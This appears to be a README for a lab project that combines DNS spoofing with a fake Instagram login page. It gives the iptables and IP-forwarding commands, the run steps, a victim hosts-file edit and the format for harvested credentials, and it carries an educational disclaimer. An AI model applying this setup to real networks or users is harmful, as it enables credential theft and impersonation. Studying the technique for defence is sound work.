
# DNS Spoofer Project

This project simulates a DNS Spoofing and Phishing scenario for **ethical and educational** purposes inside a controlled environment.

## ⚠️ Legal Disclaimer

> This project is for **educational and authorized lab testing only**. Do not use this on real networks or without explicit permission. Unauthorized usage may be illegal.

---

## 📁 Project Structure

```
dns_spoofer_project/
├── spoof/
│   └── dns_spoof.py            # DNS spoofing script using NetfilterQueue and Scapy
├── phishing_server/
│   ├── app.py                  # Flask web server simulating phishing pages
│   ├── templates/
│   │   └── instagram.html      # Fake Instagram login page
│   └── static/                 # Static assets like CSS, logos
└── credentials.txt             # Logged credentials (generated at runtime)
```

---

## 🔧 Requirements

- Python 3.x (tested on Kali Linux)
- `scapy`
- `netfilterqueue`
- `flask`
- Root access
- Bridged network mode for VMs (recommended)
- Windows VM for victim (e.g. Win22)

Install dependencies:

```bash
sudo apt install python3-netfilterqueue
pip install flask scapy
```

---

## 1️⃣ Enable IP Forwarding and Setup IPTables

```bash
# Enable IP forwarding
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Redirect DNS requests (UDP 53) to local machine
sudo iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 53

# Queue packets for NetfilterQueue
sudo iptables -I FORWARD -p udp --dport 53 -j NFQUEUE --queue-num 0
```

---

## 2️⃣ Run DNS Spoofing

```bash
sudo python3 spoof/dns_spoof.py
```

The script will intercept DNS requests for a specific domain (e.g. `instagram.com`) and redirect them to your fake server's IP (Kali's IP).

---

## 3️⃣ Run the Phishing Server

```bash
cd phishing_server
export FLASK_APP=app.py
sudo flask run --host=0.0.0.0 --port=80
```

Make sure Kali is listening on port 80 and its IP matches the spoof target (default: `192.168.1.100`).

---

## 4️⃣ (Optional) Host File Redirect on Victim

Edit the **hosts** file on the victim's machine (e.g. Windows 22):

```
C:\Windows\System32\drivers\etc\hosts
```

Add a line to redirect the domain:

```
192.168.1.100    instagram.com
```

This ensures DNS bypass and always resolves to your fake server.

---

## 📝 Collected Credentials

Captured data is stored in:

```
credentials.txt
```

Example format:

```
[2025-07-03 17:00:00] Instagram | Email: test@example.com | Password: pass123 | IP: 192.168.1.198 | User-Agent: Mozilla/5.0...
```

---

## 💡 Notes

- Use **Bridge Network** mode to allow real IP assignment in LAN.
- DNS over HTTPS (DoH) can bypass spoofing – test with hosts file if needed.
- Test everything on **lab networks only**.

---

## 📚 Future Improvements

- HTTPS handling with SSLStrip
- MITM proxy injection
- Multi-domain spoofing
- Browser fingerprinting

---

## ✅ Conclusion

This project gives hands-on experience with DNS spoofing and phishing simulations, helping understand cyber threat techniques in a safe environment.
